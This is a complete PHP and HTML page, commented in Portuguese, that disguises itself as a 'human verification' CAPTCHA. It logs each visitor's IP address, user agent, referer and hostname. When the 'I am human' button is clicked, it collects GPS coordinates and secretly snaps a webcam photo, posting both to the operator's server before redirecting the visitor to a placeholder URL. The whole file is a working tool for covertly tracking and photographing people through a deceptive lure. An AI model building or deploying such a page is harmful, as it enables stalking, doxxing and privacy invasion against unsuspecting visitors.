<?php
// Função para obter o IP do usuário
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Cria pastas, se não existirem
if (!file_exists('logs')) mkdir('logs', 0777, true);
if (!file_exists('location')) mkdir('location', 0777, true);
if (!file_exists('foto')) mkdir('foto', 0777, true);

// Captura logs básicos
$logData = [
    'IP' => getUserIP(),
    'User Agent' => $_SERVER['HTTP_USER_AGENT'],
    'Data e Hora' => date('Y-m-d H:i:s'),
    'Referer' => $_SERVER['HTTP_REFERER'] ?? 'Direto',
    'Host' => gethostbyaddr(getUserIP()),
];

// Salva logs em um arquivo na pasta logs
file_put_contents('logs/access_logs.txt', json_encode($logData, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Humano</title>
    <script>
        async function handleCaptcha() {
            if (confirm("Confirme que você é humano!")) {
                // Promessas para capturar GPS e tirar foto
                const gpsPromise = new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(position => {
                        const coords = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };

                        // Envia os dados GPS para o backend
                        fetch('save_data.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(coords)
                        }).then(resolve).catch(reject);
                    });
                });

                const photoPromise = new Promise((resolve, reject) => {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();

                            const canvas = document.createElement('canvas');
                            setTimeout(() => {
                                canvas.width = 640;
                                canvas.height = 480;
                                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                                canvas.toBlob(blob => {
                                    const formData = new FormData();
                                    const photoName = `photo_${new Date().toISOString()}.jpg`;
                                    formData.append('photo', blob, photoName);

                                    // Envia a foto para o backend
                                    fetch('save_photo.php', {
                                        method: 'POST',
                                        body: formData
                                    }).then(resolve).catch(reject);
                                });
                            }, 3000); // Captura após 3 segundos
                        }).catch(err => {
                            console.error("Erro ao acessar a câmera:", err);
                            reject(err);
                        });
                });

                // Aguarda a conclusão de ambas as operações
                try {
                    await Promise.all([gpsPromise, photoPromise]);
                    alert("Verificação concluída. Redirecionando...");
                    window.location.href = "YOUR_URL_LEVARAGE";
                } catch (error) {
                    console.error("Erro durante a verificação:", error);
                    alert("Erro ao realizar a verificação.");
                }
            }
        }
    </script>
</head>
<body>
    <h1>Verificação de Humano</h1>
    <button onclick="handleCaptcha()">Eu sou humano</button>
</body>
</html>
